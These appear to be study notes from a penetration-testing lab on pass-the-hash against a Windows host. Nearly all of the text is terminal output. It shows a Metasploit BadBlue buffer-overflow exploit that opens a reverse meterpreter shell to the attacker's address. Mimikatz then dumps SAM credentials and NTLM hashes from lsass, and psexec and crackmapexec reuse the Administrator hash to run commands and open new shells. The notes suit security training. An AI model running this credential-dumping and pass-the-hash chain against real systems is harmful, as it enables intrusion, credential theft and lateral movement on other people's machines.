- Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately via SMB.
- We can use multiple tools to facilitate a Pass-The-Hash attack:
	- Metasploit PsExec module
	- Crackmapexec
- This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.
This will be useful in cases like down the line the vulnerability that you exploited might have been found and fixed so in those scenarios we can use the NTLM hash to gain access to meterpreter session to the target system.

Evil-Winrm and crackmapexec both the tools can be used along with the NTLM hash we got to get meterpreter session.

[[Dumping hashes with mimikatz]]

```
root@attackdefense:~# nmap -sV 10.5.21.248
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-18 20:55 IST
Nmap scan report for 10.5.21.248
Host is up (0.0018s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          BadBlue httpd 2.7
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 13 database server: main.
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.18-dev                          ]
+ -- --=[ 2084 exploits - 1124 auxiliary - 352 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use the edit command to open the 
currently active module in your editor

msf6 > search badblue

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/badblue_passthru

msf6 > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > set rhosts 10.5.21.248
rhosts => 10.5.21.248
msf6 exploit(windows/http/badblue_passthru) > options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.5.21.248      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.26.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal

msf6 exploit(windows/http/badblue_passthru) > run

[*] Started reverse TCP handler on 10.10.26.2:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (175174 bytes) to 10.5.21.248
[*] Meterpreter session 2 opened (10.10.26.2:4444 -> 10.5.21.248:49965) at 2023-07-18 21:00:02 +0530

meterpreter > pgrep lsass
776
meterpreter > migrate 776
[*] Migrating from 3484 to 776...
[*] Migration completed successfully.
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b


meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```

Background a process using `ctrl+Z` on keyboard

[[PsExec]] from Metasploit one.

```
msf6 exploit(windows/http/badblue_passthru) > search psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1   auxiliary/admin/smb/psexec_ntdsgrab                           normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   2   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
   3   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
   4   auxiliary/scanner/smb/psexec_loggedin_users                   normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   5   encoder/x86/service                                           manual     No     Register Service
   6   exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
   7   exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution
   8   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   9   exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   10  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution


Interact with a module by name or index. For example info 10, use 10 or use exploit/windows/smb/webexec

msf6 exploit(windows/http/badblue_passthru) > use 9
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.26.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/smb/psexec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ ATTACKDEFENSE  10.10.26.2:4444 -> 10.5.21.248:49965 (10.5.21.248)
msf6 exploit(windows/smb/psexec) > set lport 4422
lport => 4422
msf6 exploit(windows/smb/psexec) > set rhosts 10.5.21.248
rhosts => 10.5.21.248
msf6 exploit(windows/smb/psexec) > set smbuser Administrator
smbuser => Administrator
msf6 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
smbpass => aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.26.2:4422 
[*] 10.5.21.248:445 - Connecting to the server...
[*] 10.5.21.248:445 - Authenticating to 10.5.21.248:445 as user 'Administrator'...
[*] 10.5.21.248:445 - Selecting PowerShell target
[*] 10.5.21.248:445 - Executing the payload...
[+] 10.5.21.248:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.5.21.248
[*] Meterpreter session 3 opened (10.10.26.2:4422 -> 10.5.21.248:50248) at 2023-07-18 21:18:44 +0530

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.5.21.248 - Meterpreter session 3 closed.  Reason: User exit
msf6 exploit(windows/smb/psexec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ ATTACKDEFENSE  10.10.26.2:4444 -> 10.5.21.248:49965 (10.5.21.248)

msf6 exploit(windows/smb/psexec) > sessions -K
[*] Killing all sessions...
[*] 10.5.21.248 - Meterpreter session 2 closed.
```

With no previous sessions will be able to launch the administrator shell

```
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   RHOSTS                10.5.21.248                                                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                                yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                     no        The service display name
   SERVICE_NAME                                                                             no        The service name
   SHARE                                                                                    no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                                  no        The Windows domain to use for authentication
   SMBPass               aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d  no        The password for the specified username
   SMBUser               Administrator                                                      no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.26.2       yes       The listen address (an interface may be specified)
   LPORT     4422             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.26.2:4422 
[*] 10.5.21.248:445 - Connecting to the server...
[*] 10.5.21.248:445 - Authenticating to 10.5.21.248:445 as user 'Administrator'...
[*] 10.5.21.248:445 - Selecting PowerShell target
[*] 10.5.21.248:445 - Executing the payload...
[+] 10.5.21.248:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.5.21.248
[*] Meterpreter session 4 opened (10.10.26.2:4422 -> 10.5.21.248:50347) at 2023-07-18 21:24:48 +0530

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

[[crackmapexec]]

```
root@attackdefense:~# crackmapexec smb 10.5.21.248 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d"
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.5.21.248     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
SMB         10.5.21.248     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)


root@attackdefense:~# crackmapexec smb 10.5.21.248 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "ipconfig"
SMB         10.5.21.248     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
SMB         10.5.21.248     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)
SMB         10.5.21.248     445    ATTACKDEFENSE    [+] Executed command 
SMB         10.5.21.248     445    ATTACKDEFENSE    Windows IP Configuration
SMB         10.5.21.248     445    ATTACKDEFENSE    
SMB         10.5.21.248     445    ATTACKDEFENSE    
SMB         10.5.21.248     445    ATTACKDEFENSE    Ethernet adapter Ethernet:
SMB         10.5.21.248     445    ATTACKDEFENSE    
SMB         10.5.21.248     445    ATTACKDEFENSE    Connection-specific DNS Suffix  . : ap-south-1.compute.internal
SMB         10.5.21.248     445    ATTACKDEFENSE    Link-local IPv6 Address . . . . . : fe80::8df1:fd32:3046:53ae%4
SMB         10.5.21.248     445    ATTACKDEFENSE    IPv4 Address. . . . . . . . . . . : 10.5.21.248
SMB         10.5.21.248     445    ATTACKDEFENSE    Subnet Mask . . . . . . . . . . . : 255.255.240.0
SMB         10.5.21.248     445    ATTACKDEFENSE    Default Gateway . . . . . . . . . : 10.5.16.1
Traceback (most recent call last):
  File "/usr/bin/crackmapexec", line 33, in <module>
    sys.exit(load_entry_point('crackmapexec==5.1.4.dev0', 'console_scripts', 'crackmapexec')())
  File "/usr/lib/python3/dist-packages/cme/crackmapexec.py", line 272, in main
    asyncio.run(
  File "/usr/lib/python3.9/asyncio/runners.py", line 44, in run
    return loop.run_until_complete(main)
  File "/usr/lib/python3.9/asyncio/base_events.py", line 642, in run_until_complete
    return future.result()
  File "/usr/lib/python3/dist-packages/cme/crackmapexec.py", line 102, in start_threadpool
    await asyncio.gather(*jobs)
  File "/usr/lib/python3/dist-packages/cme/crackmapexec.py", line 68, in run_protocol
    await asyncio.wait_for(
  File "/usr/lib/python3.9/asyncio/tasks.py", line 442, in wait_for
    return await fut
  File "/usr/lib/python3.9/concurrent/futures/thread.py", line 52, in run
    result = self.fn(*self.args, **self.kwargs)
  File "/usr/lib/python3/dist-packages/cme/protocols/smb.py", line 121, in __init__
    connection.__init__(self, args, db, host)
  File "/usr/lib/python3/dist-packages/cme/connection.py", line 47, in __init__
    self.proto_flow()
  File "/usr/lib/python3/dist-packages/cme/connection.py", line 86, in proto_flow
    self.call_cmd_args()
  File "/usr/lib/python3/dist-packages/cme/connection.py", line 93, in call_cmd_args
    getattr(self, k)()
  File "/usr/lib/python3/dist-packages/cme/connection.py", line 18, in _decorator
    return func(self, *args, **kwargs)
  File "/usr/lib/python3/dist-packages/cme/protocols/smb.py", line 98, in _decorator
    smb_server.shutdown()
  File "/usr/lib/python3/dist-packages/cme/servers/smb.py", line 37, in shutdown
    if thread.isAlive():
AttributeError: '_MainThread' object has no attribute 'isAlive'

root@attackdefense:~# crackmapexec smb 10.5.21.248 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "whoami"
SMB         10.5.21.248     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
SMB         10.5.21.248     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)
SMB         10.5.21.248     445    ATTACKDEFENSE    [+] Executed command 
SMB         10.5.21.248     445    ATTACKDEFENSE    attackdefense\administrator
Traceback (most recent call last):
  File "/usr/bin/crackmapexec", line 33, in <module>
    sys.exit(load_entry_point('crackmapexec==5.1.4.dev0', 'console_scripts', 'crackmapexec')())
  File "/usr/lib/python3/dist-packages/cme/crackmapexec.py", line 272, in main
    asyncio.run(
  File "/usr/lib/python3.9/asyncio/runners.py", line 44, in run
    return loop.run_until_complete(main)
  File "/usr/lib/python3.9/asyncio/base_events.py", line 642, in run_until_complete
    return future.result()
  File "/usr/lib/python3/dist-packages/cme/crackmapexec.py", line 102, in start_threadpool
    await asyncio.gather(*jobs)
  File "/usr/lib/python3/dist-packages/cme/crackmapexec.py", line 68, in run_protocol
    await asyncio.wait_for(
  File "/usr/lib/python3.9/asyncio/tasks.py", line 442, in wait_for
    return await fut
  File "/usr/lib/python3.9/concurrent/futures/thread.py", line 52, in run
    result = self.fn(*self.args, **self.kwargs)
  File "/usr/lib/python3/dist-packages/cme/protocols/smb.py", line 121, in __init__
    connection.__init__(self, args, db, host)
  File "/usr/lib/python3/dist-packages/cme/connection.py", line 47, in __init__
    self.proto_flow()
  File "/usr/lib/python3/dist-packages/cme/connection.py", line 86, in proto_flow
    self.call_cmd_args()
  File "/usr/lib/python3/dist-packages/cme/connection.py", line 93, in call_cmd_args
    getattr(self, k)()
  File "/usr/lib/python3/dist-packages/cme/connection.py", line 18, in _decorator
    return func(self, *args, **kwargs)
  File "/usr/lib/python3/dist-packages/cme/protocols/smb.py", line 98, in _decorator
    smb_server.shutdown()
  File "/usr/lib/python3/dist-packages/cme/servers/smb.py", line 37, in shutdown
    if thread.isAlive():
AttributeError: '_MainThread' object has no attribute 'isAlive'
```

